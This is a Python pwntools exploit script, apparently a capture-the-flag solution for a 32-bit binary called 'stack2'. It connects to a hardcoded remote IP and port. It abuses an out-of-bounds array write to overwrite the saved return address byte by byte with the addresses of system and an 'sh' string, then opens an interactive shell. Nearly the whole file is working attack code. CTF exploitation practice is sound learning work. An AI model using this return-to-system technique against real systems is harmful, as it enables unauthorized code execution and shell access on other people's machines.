#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import os
import sys
from ctypes import c_uint8

elfPath = "./stack2"
libcPath = "./libc-2.23.so"
remoteAddr = "47.96.239.28"
remotePort = 2333

context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    context.log_level = "debug"
    io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    if libcPath:
        libc = ELF(libcPath)

else:
    context.log_level = "info"
    io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd = ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd = ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def show():
    io.sendlineafter("exit\n", "1")


def change(idx, num):
    io.sendlineafter("exit\n", "3")
    io.sendlineafter(":\n", str(idx))
    io.sendlineafter(":\n", str(num))

def exit():
    io.sendlineafter("exit\n", "5")

if __name__ == "__main__":
    io.sendlineafter(":\n", "1")
    io.sendline('1')
    
    '''
    0x08048450 : system
    0x08048987 : sh
    '''
    change(136 - 4, 0x50)
    change(137 - 4, 0x84)
    change(138 - 4, 0x04)
    #  DEBUG([0x804884D])
    change(139 - 4, 0x08)
    change(140 - 4, 0xff)
    change(141 - 4, 0xff)
    change(142 - 4, 0xff)
    change(143 - 4, 0xff)
    change(144 - 4, 0x87)
    change(145 - 4, 0x89)
    change(146 - 4, 0x04)
    change(147 - 4, 0x08)
    exit()
    
    io.interactive()
    io.close()


